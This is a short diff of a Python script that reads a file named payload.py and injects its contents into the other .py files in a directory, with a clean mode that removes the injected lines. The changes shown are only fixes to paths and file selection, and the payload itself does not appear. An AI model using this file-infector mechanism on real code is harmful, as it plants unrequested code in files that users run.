@@ -9,7 +9,7 @@ from this file, but doing so would execute that code when executing this file.
 import glob, sys
 
 # read contents of payload.py
-with open('./payload.py', 'r') as file:
+with open('payload.py', 'r') as file:
 	payload = file.read()
 
 def inject(file, payload=payload):
@@ -33,15 +33,18 @@ def clean(file):
 		for injected in original[end:]:
 			original.remove(injected)
 		# remove \n at the end of last line
-		original[-1] = original[-1][:-1]
+		if len(original[-1]) > 2:
+			original[-1] = original[-1][:-1]
 	with open(file, 'w') as f:
 		# write original lines to file
 		for line in original:
 			f.write(line)
 
 if __name__ == '__main__':
-	files = glob.glob('./*.py')[1:]
-	files.remove('./payload.py')
+	files = glob.glob('*.py')
+	ignored = [str(__file__), 'payload.py']
+	for file in ignored:
+		files.remove(file)
 	try:
 		cmd = sys.argv[1]
 	except IndexError:
